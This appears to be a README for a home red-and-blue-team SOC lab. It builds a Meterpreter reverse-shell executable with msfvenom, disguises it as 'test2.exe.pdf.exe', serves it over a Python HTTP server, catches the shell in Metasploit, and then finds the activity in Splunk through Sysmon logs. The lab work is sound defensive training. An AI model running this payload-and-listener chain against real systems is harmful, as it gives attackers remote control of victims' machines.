
# 🔐 Home SOC Lab – Red & Blue Team Simulation

A hands-on home SOC lab simulating real-world cyber attacks using Kali Linux and detecting them with Splunk SIEM and Sysmon in an isolated virtual environment. This project demonstrates both red team (offensive) and blue team (defensive) operations, including attack execution, log analysis, and incident response.

---

## 🛠️ Tools Used

- **Kali Linux** – Attacking machine for simulations  
- **Metasploit / MSFVenom** – Exploitation & payload generation  
- **Nmap** – Network scanning and reconnaissance  
- **Python HTTP Server** – Payload delivery  
- **Windows 10** – Target system  
- **Sysmon** – Advanced endpoint logging  
- **Splunk Enterprise** – SIEM for log analysis and detection  
- **VirtualBox** – Virtualized lab environment
  
---

## 🧱 Lab Architecture

This lab environment consists of a Kali Linux attacker machine and a Windows VM running Splunk and Sysmon for monitoring, connected through an isolated VirtualBox internal network.

![SOC Lab Architecture](screenshots/network.png)

---

## 🧱 Lab Setup

| Component | Details |
|-----------|---------|
| Attacker | Kali Linux — `192.168.0.152` |
| Target | Windows (Splunk) — `192.168.0.153` |
| Network | VirtualBox Internal Network (`tandy`) |
| Defender disabled | Windows Defender real-time protection OFF |

---

## ⚔️ Attack Chain

### 1. Reconnaissance
```bash
nmap -A 192.168.0.153 -Pn

```
![Recon](screenshots/Recon.png)

### 2. Payload Generation (MSFVenom)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=192.168.0.152 LPORT=4444 -f exe -o test2.exe.pdf.exe
```
![virus](screenshots/6.png)

### 3. Payload Delivery (Python HTTP Server)
```bash
python3 -m http.server 9999
```
![payload ](screenshots/8.png)
> Victim downloads `test2.exe.pdf.exe` via browser from `http://192.168.0.152:9999`

### 4. Listener & Shell
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.0.152
exploit
```
![shell](screenshots/7.png)
> ✅ **Meterpreter session opened: `192.168.0.152:4444 → 192.168.0.153:55532`**

### 5. Verification (on victim)
```cmd
netstat -anob | findstr 4444
# TCP 192.168.0.153:53060  192.168.0.152:4444  ESTABLISHED
```
![listening](screenshots/11.png)

---

## 🔵 Detection with Splunk

Sysmon logs forwarded to Splunk Enterprise via `inputs.conf` → `index=endpoint`
```spl
index="endpoint" test2.pdf.exe
```
![logs](screenshots/16.png)
> 4 events returned — process execution, parent process (`Explorer.EXE`), SHA256 hash, and user logged

---

## 🧠 Skills Demonstrated

- SIEM monitoring & log analysis (Splunk)  
- Endpoint logging & detection (Sysmon)  
- Threat detection & basic incident response  
- Network reconnaissance (Nmap)  
- Exploitation & payload delivery (Metasploit, MSFVenom)  
- Log correlation & investigation  
- Virtual lab setup (VirtualBox)

---

## Lessons Learned

- Importance of log visibility using Sysmon
- Challenges in detecting attacks vs normal activity
- How attackers disguise payloads using file extensions
- Value of SIEM tools in real-time monitoring

> ⚠️ **Disclaimer:** For educational purposes only in an isolated lab environment.
